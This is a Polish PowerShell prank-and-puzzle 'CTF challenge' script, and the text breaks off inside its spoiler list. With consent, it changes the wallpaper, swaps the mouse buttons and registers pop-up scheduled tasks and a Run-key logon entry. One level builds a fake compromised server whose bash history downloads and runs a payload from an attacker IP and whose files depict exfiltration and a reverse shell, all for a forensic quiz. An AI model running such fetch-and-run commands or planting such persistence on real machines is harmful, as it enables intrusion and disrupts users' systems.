# ================================================================
# CTF CHALLENGE - ULTIMATE EDITION
# Difficulty: Easy / Medium / Hard / TryHackMe
# ================================================================

#region CONSTANTS
$REG        = "HKCU:\Software\CTFChallenge"
$FN_PATH    = "$env:APPDATA\Microsoft\ctf_functions.ps1"
$VMDIR      = "$env:TEMP\CTF_VM"
$WP_PATH    = "$env:TEMP\ctf_wallpaper.png"
$PS_START   = "# === CTF_CHALLENGE_START ==="
$PS_END     = "# === CTF_CHALLENGE_END ==="
$TASK_E     = "CTF_Reminder_Easy"
$TASK_M     = "CTF_Reminder_Medium"
$TASK_H     = "CTF_Reminder_Hard"
$STARTUP_KEY = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$STARTUP_NAME = "CTF_HardMode_Reminder"
#endregion

#region HELPERS
function Write-Centered { param([string]$t, [string]$c = "White")
    $pad = [math]::Max(0, ([Console]::WindowWidth - $t.Length) / 2)
    Write-Host (" " * $pad + $t) -ForegroundColor $c }

function Write-Step { param([string]$n, [string]$msg)
    Write-Host "  [$n] " -ForegroundColor Yellow -NoNewline
    Write-Host $msg -ForegroundColor White }

function Write-OK   { Write-Host "      [OK] " -ForegroundColor Green -NoNewline; Write-Host $args[0] }
#endregion

#region BANNER
Clear-Host
@"

   ██████╗████████╗███████╗
  ██╔════╝╚══██╔══╝██╔════╝
  ██║        ██║   █████╗
  ██║        ██║   ██╔══╝
  ╚██████╗   ██║   ██║
   ╚═════╝   ╚═╝   ╚═╝   CHALLENGE — ULTIMATE EDITION

"@ | Write-Host -ForegroundColor Cyan

Write-Host "  Wszystkie zmiany sa 100% odwracalne. Wymaga zgody." -ForegroundColor DarkGray
Write-Host ""
#endregion

#region CONSENT
Write-Host "  Akceptujesz wyzwanie CTF? (tak/nie): " -ForegroundColor Cyan -NoNewline
if ((Read-Host) -ne "tak") {
    Write-Host "`n  Tchórz! :D" -ForegroundColor Red; Start-Sleep 1; exit
}
Write-Host ""
#endregion

#region DIFFICULTY SELECTION
Write-Host "  Wybierz poziom trudnosci:" -ForegroundColor Yellow
Write-Host ""
Write-Host "  [1] " -ForegroundColor Green    -NoNewline; Write-Host "Easy       " -NoNewline; Write-Host "Tapeta + zmieniony prompt + co-godzinny terminal" -ForegroundColor DarkGray
Write-Host "  [2] " -ForegroundColor Yellow   -NoNewline; Write-Host "Medium     " -NoNewline; Write-Host "Easy + odwrocone przyciski myszy + co 30min x3 okna" -ForegroundColor DarkGray
Write-Host "  [3] " -ForegroundColor Red      -NoNewline; Write-Host "Hard       " -NoNewline; Write-Host "Medium + wpis startowy + co 15min x5 okien + ROT13 flaga" -ForegroundColor DarkGray
Write-Host "  [4] " -ForegroundColor Magenta  -NoNewline; Write-Host "TryHackMe  " -NoNewline; Write-Host "Sledztwo na fałszywej VM - pytania jak na tryhackme.com" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Poziom (1-4): " -ForegroundColor Cyan -NoNewline
$diffStr = Read-Host
$diff = [int]$diffStr
if ($diff -lt 1 -or $diff -gt 4) { Write-Host "Nieprawidlowy poziom." -ForegroundColor Red; exit }

$diffName = @{1="Easy";2="Medium";3="Hard";4="TryHackMe"}[$diff]
Write-Host ""
Write-Host "  Poziom: $diffName" -ForegroundColor Cyan
Write-Host "  Instaluje wyzwanie..." -ForegroundColor Green
Write-Host ""
Start-Sleep 1
#endregion

#region SHARED C# TYPE (Mouse + Wallpaper)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class CTFSystem {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern bool SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);
    [DllImport("user32.dll")]
    public static extern bool SystemParametersInfo(uint uAction, uint uParam, IntPtr lpvParam, uint fuWinIni);
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);
    public static void SetWallpaper(string path) { SystemParametersInfo(20, 0, path, 3); }
    public static void ResetWallpaper()          { SystemParametersInfo(20, 0, "", 3); }
    public static int  GetMouseSwap()            { return GetSystemMetrics(23); }
    public static void SetMouseSwap(uint v)      { SystemParametersInfo(33, v, IntPtr.Zero, 2); }
}
"@ -ErrorAction SilentlyContinue
#endregion

#region REGISTRY INIT
New-Item -Path $REG -Force | Out-Null
New-ItemProperty -Path $REG -Name "Difficulty"     -Value $diff           -PropertyType DWord  -Force | Out-Null
New-ItemProperty -Path $REG -Name "DifficultyName" -Value $diffName       -PropertyType String -Force | Out-Null
New-ItemProperty -Path $REG -Name "StartTime"      -Value (Get-Date).ToString("o") -PropertyType String -Force | Out-Null
New-ItemProperty -Path $REG -Name "FlagSubmitted"  -Value 0               -PropertyType DWord  -Force | Out-Null
#endregion

# ================================================================
#region APPLY-EASY
# ================================================================
function Apply-Easy {
    Write-Step "1/?" "Zmieniam tapete..."
    try {
        Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/en/thumb/a/af/Rick_Astley_-_Whenever_You_Need_Somebody.png/220px-Rick_Astley_-_Whenever_You_Need_Somebody.png" `
            -OutFile $WP_PATH -UseBasicParsing -TimeoutSec 10
        [CTFSystem]::SetWallpaper($WP_PATH)
        Write-OK "Tapeta zmieniona na Rick Astleya"
    } catch { Write-OK "Tapeta (tryb offline)" }

    Write-Step "2/?" "Tworze scheduled task (co 1h)..."
    $taskScript = @'
$Host.UI.RawUI.BackgroundColor = "Black"; $Host.UI.RawUI.ForegroundColor = "Cyan"; Clear-Host
Write-Host @"
      GODZINNE PRZYPOMNIENIE od CTF Challenge

      ░▄▄▄░░▄░▄░░░▄▄░░░░░░
      ░█▄▄█░░█░░░█░░█░░░░░
      ░█░░█░░█░░░█░░█░░░░░
      ░█░░█░▄█▄░░░▄▄░░░░░░

      ♪  Never gonna give you up...
      ♪  Never gonna let you down...

  Znajdz flage: (Get-ItemProperty HKCU:\Software\CTFChallenge)
  Lub poddaj sie: Remove-CTFChallenge

"@ -ForegroundColor Cyan
Start-Sleep 15
'@
    $tPath = "$env:APPDATA\Microsoft\ctf_task_easy.ps1"
    $taskScript | Out-File $tPath -Encoding UTF8
    $act  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Normal -ExecutionPolicy Bypass -File `"$tPath`""
    $trig = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 1) -Once -At (Get-Date).AddMinutes(2)
    $set  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
    Register-ScheduledTask -TaskName $TASK_E -Action $act -Trigger $trig -Settings $set -Force | Out-Null
    Write-OK "Scheduled task: co 1 godzine, 1 okno"

    # Flag split in 2 registry values (plaintext, easy to find)
    New-ItemProperty -Path $REG -Name "FlagPart1" -Value "CTF{easy_"   -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $REG -Name "FlagPart2" -Value "w4rm_up}"    -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $REG -Name "Hint"      -Value "Zloz FlagPart1 i FlagPart2 z HKCU:\Software\CTFChallenge" -PropertyType String -Force | Out-Null
    Write-OK "Flaga ukryta w rejestrze (HKCU:\Software\CTFChallenge)"
}
#endregion

# ================================================================
#region APPLY-MEDIUM
# ================================================================
function Apply-Medium {
    Apply-Easy

    Write-Step "3/?" "Odwracam przyciski myszy..."
    $orig = [CTFSystem]::GetMouseSwap()
    New-ItemProperty -Path $REG -Name "OrigMouseSwap" -Value $orig -PropertyType DWord -Force | Out-Null
    [CTFSystem]::SetMouseSwap(1)
    Write-OK "Przyciski myszy odwrocone (lewy=prawy)"

    Write-Step "4/?" "Tworze scheduled task (co 30min, x3 okna)..."
    $msgs = @(
        "♪ Never gonna give you up ♪",
        "Szukaj flagi! Base64 czeka...",
        "Dwa kawalki. Rejestr i AppData."
    )
    $tScript = @"
`$msgs = @('$($msgs[0])','$($msgs[1])','$($msgs[2])')
foreach (`$m in `$msgs) {
    Start-Process powershell.exe -ArgumentList "-WindowStyle Normal -ExecutionPolicy Bypass -Command `"```$Host.UI.RawUI.BackgroundColor='Black';Clear-Host;Write-Host '`n  [CTF MEDIUM] ' -ForegroundColor Yellow -NoNewline;Write-Host '`$m' -ForegroundColor Cyan;Write-Host '`n  Odwrocone przyciski myszy? Tak, to my.' -ForegroundColor Red;Start-Sleep 20`""
}
"@
    $tPath = "$env:APPDATA\Microsoft\ctf_task_medium.ps1"
    $tScript | Out-File $tPath -Encoding UTF8
    $act  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tPath`""
    $trig = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).AddMinutes(2)
    $set  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
    Register-ScheduledTask -TaskName $TASK_M -Action $act -Trigger $trig -Settings $set -Force | Out-Null
    Write-OK "Scheduled task: co 30 minut, 3 okna naraz"

    # Flag: base64 split in 2 places
    # "CTF{m3d1Um_" → Q1RGe20zZDFVbV8=
    # "ch4ll3ng3}"  → Y2g0bGwzbmcz fQ==  → Y2g0bGwzbmczfQ==
    New-ItemProperty -Path $REG -Name "DataA" -Value "Q1RGe20zZDFVbV8=" -PropertyType String -Force | Out-Null
    "Y2g0bGwzbmczfQ==" | Out-File "$env:APPDATA\Microsoft\.ctfdata" -Encoding UTF8 -NoNewline
    New-ItemProperty -Path $REG -Name "Hint" -Value "Dwa kawalki Base64. Czesc 1: rejestr DataA. Czesc 2: plik w AppData\Microsoft\.ctfdata. Zdekoduj i zlacz." -PropertyType String -Force | Out-Null
    Write-OK "Flaga base64, podzielona: rejestr + AppData\.ctfdata"
}
#endregion

# ================================================================
#region APPLY-HARD
# ================================================================
function Apply-Hard {
    Apply-Medium

    Write-Step "5/?" "Dodaje wpis startowy (uruchamia sie przy logowaniu)..."
    $startupMsg = "$env:APPDATA\Microsoft\ctf_startup.ps1"
    @'
$reg = "HKCU:\Software\CTFChallenge"
$done = (Get-ItemProperty $reg -EA SilentlyContinue).FlagSubmitted
if ($done -ne 1) {
    $Host.UI.RawUI.BackgroundColor = "DarkRed"
    Clear-Host
    Write-Host "`n  [CTF HARD] Nadal nie znalazles flagi? Zalogowalem sie i widze to.`n" -ForegroundColor Yellow
    Write-Host "  Trzy odlamki. ROT13. Zlacz je." -ForegroundColor White
    Start-Sleep 8
}
'@ | Out-File $startupMsg -Encoding UTF8
    New-ItemProperty -Path $STARTUP_KEY -Name $STARTUP_NAME `
        -Value "powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -File `"$startupMsg`"" `
        -PropertyType String -Force | Out-Null
    Write-OK "Wpis startowy dodany (pojawi sie przy nastepnym logowaniu)"

    Write-Step "6/?" "Tworze scheduled task (co 15min, x5 okien)..."
    $tPath = "$env:APPDATA\Microsoft\ctf_task_hard.ps1"
    @'
1..5 | ForEach-Object {
    $i = $_
    Start-Process powershell.exe -ArgumentList "-WindowStyle Normal -ExecutionPolicy Bypass -Command `"`$Host.UI.RawUI.BackgroundColor='Black';Clear-Host;Write-Host '[CTF HARD] Okno $i/5 - Jeszcze tu jestes?' -ForegroundColor Red;Write-Host 'Trzy odlamki ROT13. Rejestr Cipher1, TEMP\ctf_h4rd.log, AppData\WindowsApps\.ctf_sys' -ForegroundColor Yellow;Start-Sleep 25`""
}
'@ | Out-File $tPath -Encoding UTF8
    $act  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tPath`""
    $trig = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) -Once -At (Get-Date).AddMinutes(2)
    $set  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 3)
    Register-ScheduledTask -TaskName $TASK_H -Action $act -Trigger $trig -Settings $set -Force | Out-Null
    Write-OK "Scheduled task: co 15 minut, 5 okien naraz"

    # Flag: ROT13("CTF{h4rd_m0d3_m4st3r}") = "PGS{u4eq_z0q3_z4fg3e}"
    # Shard1 in registry: "PGS{u4eq"
    # Shard2 in TEMP file: "_z0q3"
    # Shard3 in AppData\WindowsApps: "_z4fg3e}"
    New-ItemProperty -Path $REG -Name "Cipher1" -Value "PGS{u4eq" -PropertyType String -Force | Out-Null
    "_z0q3"   | Out-File "$env:TEMP\ctf_h4rd.log"                              -Encoding UTF8 -NoNewline
    "_z4fg3e}" | Out-File "$env:APPDATA\Microsoft\WindowsApps\.ctf_sys"         -Encoding UTF8 -NoNewline
    New-ItemProperty -Path $REG -Name "Hint" -Value "3 odlamki ROT13: Cipher1 w rejestrze, ctf_h4rd.log w TEMP, .ctf_sys w AppData\WindowsApps. Zlacz i zdekoduj ROT13." -PropertyType String -Force | Out-Null
    Write-OK "Flaga ROT13, 3 odlamki: rejestr + TEMP + AppData\WindowsApps"
}
#endregion

# ================================================================
#region APPLY-TRYHACKME (fake VM)
# ================================================================
function Apply-TryHackMe {
    Write-Step "1/?" "Tworze srodowisko VM (serwer 'srv-prod-01')..."

    $files = @{
        "etc\hostname"       = "srv-prod-01"
        "etc\passwd"         = @"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
backup:x:1001:1001:Backup User:/home/backup:/bin/bash
ctfuser:x:1337:1337:CTF User:/home/ctfuser:/bin/bash
"@
        "etc\shadow"         = @"
root:`$6`$rounds=5000`$taunyslew`$JCpWvzAFM.:18500:0:99999:7:::
admin:`$6`$rounds=5000`$xQ7nlL/Qf`$YtCp2eU.:18500:0:99999:7:::
backup:`$6`$rounds=5000`$hackme123`$vbQ5Ks.:18500:0:99999:7:::
"@
        "etc\crontab"        = @"
# /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin

# m h dom mon dow user  command
*/5 * * * * backup /home/backup/sync.sh > /dev/null 2>&1
"@
        "var\log\auth.log"   = @"
Jun  1 02:11:03 srv-prod-01 sshd[1423]: Failed password for admin from 10.13.37.42 port 51234 ssh2
Jun  1 02:11:07 srv-prod-01 sshd[1423]: Failed password for admin from 10.13.37.42 port 51235 ssh2
Jun  1 02:11:11 srv-prod-01 sshd[1423]: Failed password for admin from 10.13.37.42 port 51236 ssh2
Jun  1 02:11:15 srv-prod-01 sshd[1423]: Failed password for backup from 10.13.37.42 port 51240 ssh2
Jun  1 02:11:19 srv-prod-01 sshd[1423]: Accepted password for backup from 10.13.37.42 port 51241 ssh2
Jun  1 02:11:19 srv-prod-01 sshd[1423]: pam_unix(sshd:session): session opened for user backup by (uid=0)
Jun  1 02:15:44 srv-prod-01 sudo[2891]: backup : command not allowed ; TTY=pts/0 ; PWD=/home/backup ; command=/usr/bin/passwd
"@
        "var\log\syslog"     = @"
Jun  1 02:10:55 srv-prod-01 kernel: [UFW BLOCK] IN=eth0 SRC=10.13.37.42 DST=10.0.0.5 PROTO=TCP DPT=22
Jun  1 02:11:19 srv-prod-01 sshd[1423]: Accepted password for backup
Jun  1 02:13:10 srv-prod-01 python3[3021]: started on port 4444
Jun  1 02:14:02 srv-prod-01 systemd[1]: Stopping backup service...
"@
        "var\log\apache2\access.log" = @"
10.0.0.1 - - [01/Jun/2026:01:55:10 +0000] "GET / HTTP/1.1" 200 1024
10.13.37.42 - - [01/Jun/2026:02:09:42 +0000] "GET /admin HTTP/1.1" 403 512
10.13.37.42 - - [01/Jun/2026:02:09:55 +0000] "POST /admin/login HTTP/1.1" 200 256
10.13.37.42 - - [01/Jun/2026:02:10:01 +0000] "GET /admin/config HTTP/1.1" 200 4096
"@
        "home\backup\.bash_history" = @"
ls -la
cat /etc/passwd
cat /etc/shadow
wget http://10.13.37.42:8080/payload.sh
chmod +x payload.sh
./payload.sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /tmp/loot.txt
exit
"@
        "home\backup\.ssh\authorized_keys" = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7... attacker@evil-machine"
        "home\admin\notes.txt"  = "TODO: zmienic haslo do backup. Tymczasowe: backup123!"
        "tmp\loot.txt"          = @"
=== EXFILTRATED DATA ===
Source: srv-prod-01
Date: 2026-06-01 02:14:02
Files stolen:
  - /etc/shadow
  - /home/admin/notes.txt
  - /var/lib/mysql/users.db
Uploading to 10.13.37.42:9001 ...done
"@
        "opt\secret\.hidden_flag" = "CTF{thr34t_hunt3r}"
        "proc\net\tcp"           = @"
  sl  local_address rem_address   st tx_queue rx_queue
   0: 00000000:0016 00000000:0000 0A 00000000:00000000  (SSH :22)
   1: 00000000:115C 00000000:0000 0A 00000000:00000000  (BACKDOOR :4444)
   2: 0F00007F:0035 00000000:0000 0A 00000000:00000000  (DNS :53)
"@
    }

    foreach ($rel in $files.Keys) {
        $full = Join-Path $VMDIR $rel
        $dir  = Split-Path $full
        if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
        $files[$rel] | Out-File $full -Encoding UTF8
    }

    Write-OK "Fake VM gotowa: $VMDIR"
    Write-OK "Scenariusz: serwer srv-prod-01 zostal skompromitowany"
}
#endregion

# ================================================================
#region DISPATCH DIFFICULTY
# ================================================================
switch ($diff) {
    1 { Apply-Easy }
    2 { Apply-Medium }
    3 { Apply-Hard }
    4 { Apply-TryHackMe }
}
#endregion

# ================================================================
#region WRITE ctf_functions.ps1
# ================================================================
Write-Step "?" "Zapisuje funkcje CTF do profilu..."

# NOTE: single-quoted here-string - no variable expansion, functions define own constants
$fnContent = @'
# ================================================================
# CTF CHALLENGE - FUNCTIONS (auto-generated, nie edytuj)
# ================================================================
$_CTF_REG    = "HKCU:\Software\CTFChallenge"
$_CTF_VMDIR  = "$env:TEMP\CTF_VM"
$_CTF_WP     = "$env:TEMP\ctf_wallpaper.png"
$_TASK_E     = "CTF_Reminder_Easy"
$_TASK_M     = "CTF_Reminder_Medium"
$_TASK_H     = "CTF_Reminder_Hard"
$_STARTUP    = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$_STARTUP_N  = "CTF_HardMode_Reminder"
$_PS_START   = "# === CTF_CHALLENGE_START ==="
$_PS_END     = "# === CTF_CHALLENGE_END ==="

# Taunt on load if Hard and not solved
$_diff = (Get-ItemProperty $_CTF_REG -EA SilentlyContinue).Difficulty
$_done = (Get-ItemProperty $_CTF_REG -EA SilentlyContinue).FlagSubmitted
if ($_diff -ge 3 -and $_done -ne 1) {
    Write-Host "  [CTF HARD] Jeszcze tu jestes? Flaga czeka..." -ForegroundColor DarkRed
}
Remove-Variable _diff, _done -EA SilentlyContinue

# ================================================================
# VM COMMANDS
# ================================================================
function script:Resolve-VMPath {
    param([string]$p)
    $vmRoot = "$env:TEMP\CTF_VM"
    $p = $p -replace '^/', '' -replace '/', '\'
    $full = Join-Path $vmRoot $p
    if (!($full.StartsWith($vmRoot))) { Write-Host "  [-] Niedozwolona sciezka." -ForegroundColor Red; return $null }
    return $full
}

function vm-ls {
    param([string]$Path = "/")
    $full = Resolve-VMPath $Path
    if (!$full) { return }
    if (!(Test-Path $full)) { Write-Host "  ls: $Path`: Nie ma takiego katalogu" -ForegroundColor Red; return }
    Write-Host "  $Path/" -ForegroundColor Cyan
    Get-ChildItem $full | ForEach-Object {
        if ($_.PSIsContainer) { Write-Host "  drwxr-xr-x  $($_.Name)/" -ForegroundColor Blue }
        else {
            $hidden = $_.Name.StartsWith(".")
            $col = if ($hidden) {"DarkGray"} else {"White"}
            Write-Host "  -rw-r--r--  $($_.Name)" -ForegroundColor $col
        }
    }
}

function vm-cat {
    param([string]$Path)
    $full = Resolve-VMPath $Path
    if (!$full) { return }
    if (!(Test-Path $full) -or (Test-Path $full -PathType Container)) {
        Write-Host "  cat: $Path`: Brak pliku" -ForegroundColor Red; return
    }
    Get-Content $full | ForEach-Object { Write-Host "  $_" }
}

function vm-grep {
    param([string]$Pattern, [string]$Path, [switch]$r)
    $full = Resolve-VMPath $Path
    if (!$full) { return }
    $files = if ($r -and (Test-Path $full -PathType Container)) {
        Get-ChildItem $full -Recurse -File
    } else { Get-Item $full -EA SilentlyContinue }
    foreach ($f in $files) {
        $lines = Get-Content $f.FullName -EA SilentlyContinue
        $lines | Where-Object { $_ -match $Pattern } | ForEach-Object {
            Write-Host "  $($f.Name): " -ForegroundColor DarkGray -NoNewline
            Write-Host $_ -ForegroundColor Yellow
        }
    }
}

function vm-find {
    param([string]$Path = "/", [string]$Name = "*")
    $full = Resolve-VMPath $Path
    if (!$full) { return }
    Get-ChildItem $full -Recurse -Filter $Name -EA SilentlyContinue | ForEach-Object {
        $rel = $_.FullName.Replace("$env:TEMP\CTF_VM", "").Replace("\", "/")
        Write-Host "  .$rel" -ForegroundColor Cyan
    }
}

function vm-ps {
    Write-Host ""
    Write-Host "  PID   USER     COMMAND" -ForegroundColor Cyan
    Write-Host "  ---   ----     -------"
    @(
        "    1  root     /sbin/init",
        "  423  root     /usr/sbin/sshd -D",
        "  891  root     /usr/sbin/cron",
        " 1423  root     sshd: backup [priv]",
        " 1501  backup   -bash",
        " 3021  backup   python3 -c import socket,subprocess,os...",
        " 3022  backup   /bin/bash",
        " 4823  backup   python3 reverse_shell.py"
    ) | ForEach-Object { Write-Host $_ -ForegroundColor $(if ($_ -match "backup") {"Red"} else {"White"}) }
    Write-Host ""
}

function vm-netstat {
    Write-Host ""
    Write-Host "  Proto  Local Address         State       PID/Process" -ForegroundColor Cyan
    Write-Host "  -----  -------------         -----       -----------"
    @(
        "  tcp    0.0.0.0:22            LISTEN      423/sshd",
        "  tcp    0.0.0.0:4444          LISTEN      3021/python3   <-- PODEJRZANE!",
        "  tcp    127.0.0.1:53          LISTEN      701/dnsmasq",
        "  tcp    10.0.0.5:22           ESTABLISHED 1423/sshd"
    ) | ForEach-Object {
        $col = if ($_ -match "PODEJRZANE") {"Red"} else {"White"}
        Write-Host $_ -ForegroundColor $col
    }
    Write-Host ""
}

function vm-whoami { Write-Host "  backup" -ForegroundColor Yellow }
function vm-id     { Write-Host "  uid=1001(backup) gid=1001(backup) groups=1001(backup)" -ForegroundColor Yellow }

function vm-help {
    Write-Host ""
    Write-Host "  Dostepne komendy VM:" -ForegroundColor Cyan
    Write-Host "  vm-ls [sciezka]          - listuje katalog" -ForegroundColor White
    Write-Host "  vm-cat <sciezka>         - wyswietla plik" -ForegroundColor White
    Write-Host "  vm-grep <wzorzec> <plik> - szuka w pliku" -ForegroundColor White
    Write-Host "  vm-find [sciezka] [-Name <wzorzec>] - szuka plikow" -ForegroundColor White
    Write-Host "  vm-ps                    - lista procesow" -ForegroundColor White
    Write-Host "  vm-netstat               - polaczenia sieciowe" -ForegroundColor White
    Write-Host "  vm-whoami                - aktualny uzytkownik" -ForegroundColor White
    Write-Host "  Start-CTFInvestigation   - wznow pytania Q&A" -ForegroundColor Yellow
    Write-Host ""
}

# ================================================================
# TRYHACKME Q&A
# ================================================================
function Start-CTFInvestigation {
    $reg = "HKCU:\Software\CTFChallenge"
    $vmRoot = "$env:TEMP\CTF_VM"

    Clear-Host
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor Magenta
    Write-Host "  TRYHACKME CTF - Sledztwo: Skompromitowany serwer" -ForegroundColor Magenta
    Write-Host "  ================================================================" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "  Serwer 'srv-prod-01' zostal zaatakowany." -ForegroundColor White
    Write-Host "  Twoim zadaniem jest przeanalizowanie sladow i odpowiedzenie na pytania." -ForegroundColor White
    Write-Host "  Uzyj komend vm-* do eksploracji. Wpisz vm-help po liste komend." -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  Masz dostep jako: " -ForegroundColor DarkGray -NoNewline
    Write-Host "analyst@investigation-box" -ForegroundColor Green
    Write-Host "  Serwer docelowy: " -ForegroundColor DarkGray -NoNewline
    Write-Host "backup@srv-prod-01" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor DarkGray
    Write-Host ""
    Start-Sleep 1

    $questions = @(
        @{
            Q    = "[ TASK 1 ] Jaka jest nazwa hosta atakowanego serwera?"
            Hint = "Komenda: vm-cat /etc/hostname"
            Ans  = "srv-prod-01"
        },
        @{
            Q    = "[ TASK 2 ] Z jakiego adresu IP przeprowadzono atak?"
            Hint = "Komenda: vm-grep 'Accepted' /var/log/auth.log"
            Ans  = "10.13.37.42"
        },
        @{
            Q    = "[ TASK 3 ] Jaki numer portu uzywa backdoor atakujacego?"
            Hint = "Komenda: vm-netstat"
            Ans  = "4444"
        },
        @{
            Q    = "[ TASK 4 ] Jaki plik zostal skradziony z serwera?"
            Hint = "Komenda: vm-cat /tmp/loot.txt"
            Ans  = "/etc/shadow"
        },
        @{
            Q    = "[ TASK 5 ] Jaka komenda zostala uzyta do uzyskania interaktywnej powloki?"
            Hint = "Komenda: vm-cat /home/backup/.bash_history"
            Ans  = "python3 -c 'import pty;pty.spawn(`"/bin/bash`")'"
        },
        @{
            Q    = "[ TASK 6 - FLAG ] Znajdz i podaj ukryta flage CTF (format: CTF{...})"
            Hint = "Komenda: vm-find / -Name .hidden_flag   a potem: vm-cat /opt/secret/.hidden_flag"
            Ans  = "CTF{thr34t_hunt3r}"
        }
    )

    $score = 0
    foreach ($q in $questions) {
        Write-Host ""
        Write-Host "  $($q.Q)" -ForegroundColor Yellow
        Write-Host ""
        $answered = $false
        while (!$answered) {
            Write-Host "  Twoja odpowiedz: " -ForegroundColor Cyan -NoNewline
            $input = (Read-Host).Trim()
            if ($input -eq "?") {
                Write-Host "  [HINT] $($q.Hint)" -ForegroundColor DarkYellow
                continue
            }
            if ($input.ToLower() -eq $q.Ans.ToLower()) {
                Write-Host "  [+] Poprawnie!" -ForegroundColor Green
                $score++
                $answered = $true
            } else {
                Write-Host "  [-] Niepoprawnie. Wpisz '?' po podpowiedz, lub sprobuj jeszcze raz." -ForegroundColor Red
            }
        }
    }

    # All correct - win!
    Set-ItemProperty $reg -Name "FlagSubmitted" -Value 1 -EA SilentlyContinue
    Show-WinScreen -Flag "CTF{thr34t_hunt3r}" -Difficulty 4
    Invoke-CTFCleanup -Difficulty 4
}

# ================================================================
# ROT13 HELPER
# ================================================================
function ConvertFrom-Rot13 {
    param([string]$text)
    -join ($text.ToCharArray() | ForEach-Object {
        $b = [byte][char]$_
        if     ($b -ge 65 -and $b -le 90)  { [char](($b - 65 + 13) % 26 + 65) }
        elseif ($b -ge 97 -and $b -le 122) { [char](($b - 97 + 13) % 26 + 97) }
        else   { $_ }
    })
}

# ================================================================
# CORRECT FLAGS PER DIFFICULTY
# ================================================================
function Get-CorrectFlag {
    param([int]$d)
    @{ 1="CTF{easy_w4rm_up}"; 2="CTF{m3d1Um_ch4ll3ng3}"; 3="CTF{h4rd_m0d3_m4st3r}"; 4="CTF{thr34t_hunt3r}" }[$d]
}

# ================================================================
# SUBMIT-CTFFLAG — NORMALNE ZAKONCZENIE
# ================================================================
function Submit-CTFFlag {
    param([string]$Flag)
    $reg  = "HKCU:\Software\CTFChallenge"
    $d    = (Get-ItemProperty $reg -EA SilentlyContinue).Difficulty
    if (!$d) { Write-Host "  Brak aktywnego challengu." -ForegroundColor Red; return }

    if ($d -eq 4) {
        Write-Host "  Tryb TryHackMe - uzyj Start-CTFInvestigation zamiast Submit-CTFFlag" -ForegroundColor Yellow
        return
    }

    $correct = Get-CorrectFlag -d $d
    if ($Flag -ne $correct) {
        $hints = @{
            1 = "Sprawdz HKCU:\Software\CTFChallenge - zloz FlagPart1 i FlagPart2"
            2 = "Base64: DataA w rejestrze + plik AppData\Microsoft\.ctfdata. Zdekoduj i zlacz."
            3 = "ROT13: Cipher1 w rejestrze + TEMP\ctf_h4rd.log + AppData\WindowsApps\.ctf_sys. Zlacz i zdekoduj ConvertFrom-Rot13."
        }
        Write-Host ""
        Write-Host "  [-] Zla flaga. Sprobuj jeszcze raz!" -ForegroundColor Red
        Write-Host "  [?] Podpowiedz: $($hints[$d])" -ForegroundColor DarkYellow
        Write-Host ""
        return
    }

    Set-ItemProperty $reg -Name "FlagSubmitted" -Value 1 -EA SilentlyContinue
    Show-WinScreen -Flag $Flag -Difficulty $d
    Invoke-CTFCleanup -Difficulty $d
}

# ================================================================
# REMOVE-CTFCHALLENGE — WCZESNE ZAKONCZENIE (WSTYD)
# ================================================================
function Remove-CTFChallenge {
    $reg = "HKCU:\Software\CTFChallenge"
    $d   = (Get-ItemProperty $reg -EA SilentlyContinue).Difficulty
    if (!$d) { Write-Host "  Brak aktywnego challengu." -ForegroundColor Red; return }
    if ((Get-ItemProperty $reg -EA SilentlyContinue).FlagSubmitted -eq 1) {
        Write-Host "  Challenge juz rozwiazany!" -ForegroundColor Green; return
    }

    Clear-Host
    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════╗" -ForegroundColor DarkRed
    Write-Host "  ║         ZAKONCZENIE WCZESNE - PODDALES SIE          ║" -ForegroundColor DarkRed
    Write-Host "  ╚══════════════════════════════════════════════════════╝" -ForegroundColor DarkRed
    Write-Host ""
    Write-Host "          ( . _ . )" -ForegroundColor Yellow
    Write-Host "          (> 🏳️ <)   << biala flaga sramu" -ForegroundColor Yellow
    Write-Host "           / | \ " -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Nie znalazles flagi. Wstyd." -ForegroundColor Red
    Write-Host ""

    $spoilers = @{
        1 = @(
            "  Flaga byla podzielona na dwie czesci w rejestrze:",
            "    HKCU:\Software\CTFChallenge\FlagPart1  = 'CTF{easy_'",
            "    HKCU:\Software\CTFChallenge\FlagPart2  = 'w4rm_up}'",
            "  Kompletna flaga: CTF{easy_w4rm_up}"
        )
        2 = @(
            "  Dwie czesci zakodowane Base64:",
